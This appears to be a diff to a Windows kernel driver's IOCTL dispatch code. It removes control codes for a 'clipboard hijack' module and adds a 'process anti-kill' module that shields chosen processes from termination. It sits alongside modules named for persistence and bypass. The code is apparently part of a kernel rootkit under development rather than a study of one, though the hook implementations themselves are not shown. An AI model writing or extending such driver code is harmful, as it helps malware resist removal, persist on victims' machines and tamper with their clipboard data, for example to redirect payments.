@@ -1,8 +1,8 @@
 #include "Dispatch.h"
 #include "ProcessModule.h"
+#include "ProcessProtect.h"
 #include "ThreadModule.h"
 #include "TaskPersistence.h"
-#include "ClipboardHook.h"
 #include "Bypass.h"
 #include "Shared.h"
 #include <ntddk.h>
@@ -216,52 +216,36 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     break;
 
   // ------------------------------------------------------
-  // Clipboard hijack module (see ClipboardHook.c)
+  // Process anti-kill module (see ProcessProtect.c)
   // ------------------------------------------------------
-  case IOCTL_CLIP_ARM:
-    DbgPrint("CLIP_ARM requested.\n");
-    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
-      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
-      response->Status = ClipboardHookArm();
-      response->Data = 1;
-      bytesReturned = sizeof(DRIVER_RESPONSE);
-    } else {
-      status = STATUS_BUFFER_TOO_SMALL;
-    }
-    break;
-
-  case IOCTL_CLIP_DISARM:
-    DbgPrint("CLIP_DISARM requested.\n");
-    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
-      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
-      response->Status = ClipboardHookDisarm();
-      response->Data = 0;
-      bytesReturned = sizeof(DRIVER_RESPONSE);
-    } else {
-      status = STATUS_BUFFER_TOO_SMALL;
-    }
-    break;
-
-  case IOCTL_CLIP_STATUS:
-    DbgPrint("CLIP_STATUS requested.\n");
-    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
-      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
-      BOOLEAN armed = FALSE;
-      response->Status = ClipboardHookStatus(&armed);
-      response->Data = armed ? 1 : 0;
-      bytesReturned = sizeof(DRIVER_RESPONSE);
-    } else {
-      status = STATUS_BUFFER_TOO_SMALL;
-    }
-    break;
-
-  case IOCTL_CLIP_SET_TEXT:
-    DbgPrint("CLIP_SET_TEXT requested.\n");
-    if (inputLength >= sizeof(WCHAR) &&
-        inputLength / sizeof(WCHAR) <= CLIP_MAX_TEXT_CHARS) {
-      status = ClipboardHookSetText((PWCHAR)inputBuffer,
-                                    inputLength / sizeof(WCHAR));
+  case IOCTL_PROTECT_PROCESS:
+    DbgPrint("PROTECT_PROCESS requested.\n");
+    if (inputLength == sizeof(PROCESS_REQUEST)) {
+      PROCESS_REQUEST req = *(PPROCESS_REQUEST)inputBuffer;
+      status = ProcessProtect(req.ProcessId);
       bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_UNPROTECT_PROCESS:
+    DbgPrint("UNPROTECT_PROCESS requested.\n");
+    if (inputLength == sizeof(PROCESS_REQUEST)) {
+      PROCESS_REQUEST req = *(PPROCESS_REQUEST)inputBuffer;
+      status = ProcessUnprotect(req.ProcessId);
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_LIST_PROTECTED_PROCESSES:
+    DbgPrint("LIST_PROTECTED_PROCESSES requested.\n");
+    if (outputLength == sizeof(PROTECTED_PROCESS_LIST_RESPONSE)) {
+      status =
+          ProcessListProtected((PPROTECTED_PROCESS_LIST_RESPONSE)outputBuffer);
+      bytesReturned = sizeof(PROTECTED_PROCESS_LIST_RESPONSE);
     } else {
       status = STATUS_INVALID_BUFFER_SIZE;
     }
